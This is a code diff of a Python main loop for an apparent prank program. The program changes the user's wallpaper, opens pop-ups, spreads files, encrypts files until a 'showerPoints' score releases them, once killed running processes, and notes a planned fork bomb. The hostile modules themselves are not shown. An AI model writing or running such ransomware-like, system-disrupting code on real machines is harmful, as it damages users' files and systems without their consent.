@@ -3,10 +3,11 @@ from addRandomGrassFiles import main as randGrassFileMain
 from change_wallpaper import change_wallpaper
 from initial_pop_up_window import initial_pop_up_run
 from lawnmower import main as lawnmowerMain
-from encrypted import main as encryptedMain
+from encrypted import main as encryptedMain, decryptAll
 import random
 import time
 import os
+#import keyboard
 
 #Showerpoints related constants
 
@@ -58,20 +59,21 @@ def adjustLevel():
 def randomEvent():
     global showerPoints
     if currLvl > 0:
-        prob = SPPROBS[currLvl] - 1
+        prob = SPPROBS[currLvl+1]
         doEvent = random.randint(1, prob)
         if doEvent == 1:
             event = random.randint(1, len(events))
             #TODO choose random event
+            events[event-1]()
 
 
-def lowerShowerScale():
+def changeShowerScale():
     global showerPoints
     showerPoints -= IDLESPDEC
     for p, v in nerdyProcessPoints.items():
         if isRunning(p):
              #print(p, v)
-            showerPoints -= v
+            showerPoints += v
 
 def rewards():
     global showerPoints
@@ -80,16 +82,23 @@ def rewards():
     if showerPoints >= LAWNMOWERSP:
         if (os.path.isfile(os.getcwd()+"/"+"lawnmower.txt")):
             lawnmowerMain()
+    if showerPoints >= DECRYPTSP:
+        if (os.path.isfile(os.getcwd()+"/"+"encryptedLocation.txt")):
+            decryptAll()
 
 
 
-terminateRandNerdProcess()
+
+
+
 
 change_wallpaper()
 initial_pop_up_run()
 
+randomEvent()
 while True:
-    lowerShowerScale()
+    changeShowerScale()
+    if (showerPoints > STARTINGSP) : showerPoints = STARTINGSP
     if (showerPoints <= SHUTDOWNSP):
         break #TODO fork bomb
 
